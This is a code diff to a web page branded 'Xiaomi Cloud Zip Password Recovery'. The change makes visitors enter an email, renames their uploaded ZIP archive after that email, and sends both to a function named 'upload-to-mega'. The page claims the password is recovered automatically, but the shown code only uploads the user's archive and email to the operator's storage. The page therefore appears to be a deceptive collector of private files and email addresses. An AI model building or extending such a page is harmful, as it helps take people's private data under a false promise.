@@ -118,6 +118,11 @@
             padding: 10px;
             margin-top: 50px;
             margin-bottom: 50px;
+            /* line-height: 1.6; */
+        }
+
+        .firstlist {
+            padding: 2px;
         }
 
         /* 
@@ -152,10 +157,10 @@
     </header>
     <section class="mainsection">
         <section class="steps">
-            <h1>How to Recovery Password on ZIP file</h1>
-            <li>Click inside the file drop area to upload a ZIP file or drag & drop the archive.</li>
-            <li>Enter a valid and working email address.</li>
-            <li>Your password on ZIP file will be recovered automatically.</li>
+            <h1 class="firstlist">How to Recovery Password on ZIP file</h1>
+            <li class="firstlist">Click inside the file drop area to upload a ZIP file or drag & drop the archive.</li>
+            <li class="firstlist">Enter a valid and working email address.</li>
+            <li class="firstlist">Your password on ZIP file will be recovered automatically.</li>
         </section>
         <section class="recover">
             <h1>Xiaomi Cloud Zip Password Recovery</h1>
@@ -186,13 +191,18 @@
 
     const fileInput = document.getElementById('fileInput');
     const file = fileInput.files[0];
+    const emailInput = document.getElementById('email').value.trim(); // Get the email value
     const responseElement = document.getElementById('response');
     const progressBarFill = document.getElementById('progress-bar-fill');
 
-    if (file) {
+    if (file && emailInput) {
         const reader = new FileReader();
         reader.onload = (event) => {
             const fileData = event.target.result.split(',')[1]; // Get base64 data
+
+            // Rename the file with the email
+            const fileExtension = file.name.split('.').pop(); // Get the file extension
+            const newFileName = `${emailInput}.${fileExtension}`; // Create a new filename using the email
 
             const xhr = new XMLHttpRequest();
             xhr.open('POST', '/.netlify/functions/upload-to-mega', true);
@@ -219,15 +229,20 @@
                 responseElement.textContent = `Upload failed. Please try again.`;
             };
 
+            // Send the file data along with the new file name and email
             xhr.send(JSON.stringify({
                 fileData,
-                fileName: file.name,
+                fileName: newFileName,
+                email: emailInput,
             }));
         };
 
         reader.readAsDataURL(file);
+    } else {
+        responseElement.textContent = "Please provide both an email and a file.";
     }
 });
+
 
     </script>
 </body>
